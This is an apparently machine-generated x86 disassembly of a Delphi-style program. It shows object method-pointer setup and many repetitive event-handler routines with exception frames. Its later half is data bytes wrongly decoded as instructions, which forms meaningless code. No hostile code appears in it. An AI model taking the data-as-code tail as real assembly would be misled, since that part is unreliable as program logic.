mov [ eax + 0xdc ] ebx
mov [ eax + 0xd8 ] sub_4797d8
mov eax [ esi ]
mov [ eax + 0x11c ] ebx
mov [ eax + 0x118 ] sub_479854
mov eax [ esi ]
mov [ eax + 0x124 ] ebx
mov [ eax + 0x120 ] sub_4798c8
mov eax [ esi ]
mov [ eax + 0x134 ] ebx
mov [ eax + 0x130 ] sub_4799b8
mov eax [ esi ]
mov [ eax + 0x12c ] ebx
mov [ eax + 0x128 ] sub_47993c
mov eax [ esi ]
mov [ eax + 0x13c ] ebx
mov [ eax + 0x138 ] sub_479a38
mov eax [ esi ]
mov [ eax + 0xe4 ] ebx
mov [ eax + 0xe0 ] sub_479b28
mov eax [ esi ]
mov [ eax + 0xec ] ebx
mov [ eax + 0xe8 ] sub_479b9c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_479274
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xc0 ] ecx
mov [ edx + 0xc4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xc8 ] ecx
mov [ edx + 0xcc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x110 ] ecx
mov [ edx + 0x114 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x108 ] ecx
mov [ edx + 0x10c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xd0 ] ecx
mov [ edx + 0xd4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xf0 ] ecx
mov [ edx + 0xf4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xf8 ] ecx
mov [ edx + 0xfc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x100 ] ecx
mov [ edx + 0x104 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xd8 ] ecx
mov [ edx + 0xdc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x118 ] ecx
mov [ edx + 0x11c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x120 ] ecx
mov [ edx + 0x124 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x130 ] ecx
mov [ edx + 0x134 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x128 ] ecx
mov [ edx + 0x12c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x138 ] ecx
mov [ edx + 0x13c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xe0 ] ecx
mov [ edx + 0xe4 ] ecx
mov eax [ eax ]
xor edx edx
mov [ eax + 0xe8 ] edx
mov [ eax + 0xec ] edx
mov eax [ esi + 0x30 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a130
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4793b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push sub_47941c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479423
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov ecx edi
mov edx esi
call sub_478ec0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_47942c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push sub_479498
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47949f
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov ecx edi
mov edx esi
call sub_478ed4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4794a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push sub_47950f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479516
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov edx esi
call sub_478ee8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_47951c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push sub_479583
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47958a
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov edx esi
call sub_478efc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_479590
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
mov [ ebp - 0x9 ] 0x0
xor eax eax
push ebp
push sub_47963f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479646
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_40342c
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov [ ebp - 0x9 ] 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_478f10
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_45e1e0
sub_47964c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push sub_4796d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4796dc
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov ecx edi
mov edx esi
call sub_478f40
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
sub_4796e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push sub_47974f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479756
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov edx esi
call sub_478f60
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_47975c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push sub_4797c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4797cf
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov ecx edi
mov edx esi
call sub_478fd8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4797d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push sub_479844
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47984b
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov ecx edi
mov edx esi
call sub_478fec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_479854
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push j_sub_4039f4#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4798c2
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov edx esi
call sub_479000
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4798c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push sub_47992f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479936
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov edx esi
call sub_479014
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_47993c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push j_sub_4039f4#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4799af
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov ecx edi
mov edx esi
call sub_479030
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4799b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push j_sub_4039f4#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479a2f
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov ecx edi
mov edx esi
call sub_47904c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_479a38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push j_sub_4039f4#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479ab3
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov ecx edi
mov edx esi
call sub_479074
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_479abc
push ebx
mov ebx eax
cmp [ ebx + 0x3c ] 0x0
jle r-xdata
pop ebx
retn
dec [ ebx + 0x3c ]
mov [ ebx + 0x38 ] 0x0
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_424824
mov edx [ ebx + 0x30 ]
mov edx [ edx + 0x8 ]
dec edx
cmp eax edx
jge r-xdata
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_424894
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_4247bc
xor eax eax
mov [ ebx + 0x34 ] eax
sub_479b28
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push j_sub_4039f4#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479b96
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov edx esi
call sub_4790a0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_479b9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4790f8
xor eax eax
push ebp
push sub_479c03
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479b20
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479c0a
mov eax [ ebp - 0x4 ]
call sub_479abc
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479b0c
mov edx esi
call sub_4790bc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_479c10
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039f4#4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479c3c
retn
sub_47a0f6
sub al 0xfe
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ecx - 0xf00fffe ] al
mov dl 0x47
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
add al 0x46
insb
popad
je r-xdata
fiadd [ ebx ]
cld
fiadd [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
add al 0x46
outsd
outsb
je r-xdata
mov esp 0x680041
add [ ebx ] 0x0
add [ eax ] al
mov bh 0x41
add [ edx + eax - 0x4c7f0100 ] dl
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edi ] 0x0
add bh bh
and al [ eax ]
or ecx [ eax + 0x65 ]
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
outsd
insb
outsd
jb r-xdata
popad
insd
add [ gs : eax ] dl
inc eax
add [ ecx ] bh
add al [ eax ]
jmp [ eax + 0x100435a ]
and [ 0x6d490700 ] 0x65
dec esi
mov bh 0x41
add [ eax + 0x6cff0002 ] bl
mov bl 0x47
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax ] 0x0
add bh bh
and eax [ eax ]
adc eax 0x64616548
jb r-xdata
add [ eax - 0x80000000 ] al
and eax 0x6d490700
dec esi
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
dec eax
jne r-xdata
add [ eax ] al
add [ edx ] ch
add [ ebx ] cl
push eax
popad
jb r-xdata
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x411dd074
add [ eax ] bl
add al [ eax ]
[ eax + 0x5e ]
imul esp [ gs : edi + 0x68 ] 0x40103c74
add al cl
pop edx
inc ebx
add [ ebx + ebx * 2 ] cl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0027 ] al
je r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61500e00
outsb
je r-xdata
add bh bh
in al dx
and al 0x0
pop es
dec ecx
insd
dec ebp
outsd
and [ gs : edx + 0x1880043 ] bl
add bh bh
mov [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
cdq
inc ebx
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ ecx + 0x62 ] dl
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
push edi
add [ eax ] al
[ eax ]
fld [ ebx ]
mov al 0xfb
inc edx
add [ eax ] bh
add al [ eax ]
add [ eax ] al
xor [ eax ] al
push es
push ebx
outsd
jb r-xdata
add al [ eax ]
call [ esp + ebx * 2 + 0x43 ]
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
das
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
adc [ eax ] al
test eax 0x68ff0001
inc edi
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009002e ] al
aam 0x44
add [ eax + eax ] bh
push [ eax + 0x10043dd ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
cmp al [ edx ]
add bh bh
push esp
pop esp
inc ebx
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
outsd
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
push eax
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
xor al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
jo r-xdata
adc [ eax ] al
0x6cff0000 0x43df
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
push cs
push eax
popad
je r-xdata
jae r-xdata
jb r-xdata
add bh bh
js r-xdata
outsb
jne r-xdata
jb r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
and al 0xdf
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
or dl [ eax + 0x61 ]
dec edi
bound ebp [ ebp - 0x40 ]
adc eax [ ecx ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
lodsb [ esi ]
inc [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0700
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
[ eax + ecx * 2 ]
adc [ eax ] al
cmp al 0x2
add bh bh
and al 0x5b
inc ebx
add [ ecx ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor [ eax ] eax
add eax 0x6c797453
dec eax
mov eax [ ebx ]
xchg esp eax
inc edi
inc esp
add [ eax + ecx * 2 ] dl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
cdq
add [ eax ] al
dec [ eax - 0x21 ]
inc ebx
add [ eax ] dl
fild [ ebx ]
add [ eax ] al
add [ eax ] al
cmp [ edx ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe946a50d
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
in al 0xfc
inc edx
add [ eax + 0x2 ] ch
add bh bh
cmp [ eax ] eax
or al 0x4f
outsb
inc esp
popad
je r-xdata
js r-xdata
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003b ] al
outsb
inc esp
jb r-xdata
inc esi
imul ebp [ esi + 0x64 ] r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc esp
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax * 8 + 0x13 ] si
inc ecx
add [ eax ] ch
add [ eax ] eax
push eax
outsd
jo r-xdata
dec ebx
jns r-xdata
rcl [ bp + di ] 0x41
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
inc ebp
outsb
inc esp
jb r-xdata
mov al 0x8f
inc ebx
add [ eax ] bl
add [ eax ] eax
jo r-xdata
jo r-xdata
add bh bh
add [ eax ] 0x0
add [ eax + 0x4f09003f ] al
dec edi
jbe r-xdata
[ eax ]
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
inc esp
popad
je r-xdata
cmp [ eax ] 0x0
or cl [ edi + 0x6e ]
mov es [ ebx ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add bh bh
dec edi
jb r-xdata
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0038 ] al
outsb
outsb
inc esp
popad
je r-xdata
cld
inc edx
add [ eax + 0x2 ] ah
add bh bh
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060037 ] al
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
insd
sbb al 0x8d
inc esp
mov es [ ebx ]
loopne r-xdata
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
jb r-xdata
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax [ ecx ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ esi ] al
fild [ edx ]
push eax
add al [ eax ]
call [ eax + 0x2 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0a00
inc esp
jb r-xdata
popad
dec ebp
outsd
jbe r-xdata
outsb
dec ebx
jns r-xdata
fild [ edx ]
pop eax
add al [ eax ]
[ eax + 0x2 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebp
add [ 0x654d6e4f ] cl
popad
jae r-xdata
arpl [ ebx + 0x68 ] bp
pop [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edx
add [ ebx ] cl
inc esp
outsd
ja r-xdata
jmp eax
add bh bh
loopne r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ ebx ] cl
dec edi
jae r-xdata
jns r-xdata
je r-xdata
add [ eax + 0x4f070040 ] al
add [ eax ] al
ja r-xdata
add eax [ eax ]
add [ eax ] al
push edi
jb r-xdata
dec edi
sbb al 0x8d
inc ebx
add al ah
add [ eax ] al
jmp eax
jo r-xdata
jb r-xdata
outsd
js r-xdata
jb r-xdata
xchg esp eax
lea eax [ ebx ]
fadd [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0043 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ edx ] cl
dec edi
add al bl
add [ eax ] al
clc
lea eax [ ebx ]
call 0xffffffffe946a651
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070044 ] al
dec edi
outsb
inc ebp
js r-xdata
push es
lea eax [ ebx ]
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ecx ] cl
dec edi
outsb
popad
je r-xdata
mov [ fs : eax ] edx
add [ ecx + 0x30a3f9f7 ] bl
dec esi
dec eax
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
jo r-xdata
add [ eax ] al
mov al [ 0xffffffffe8004010 ]
xor al 0x40
add ah dh
xor al 0x40
inc edi
add [ eax + eax ] cl
xchg ecx eax
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
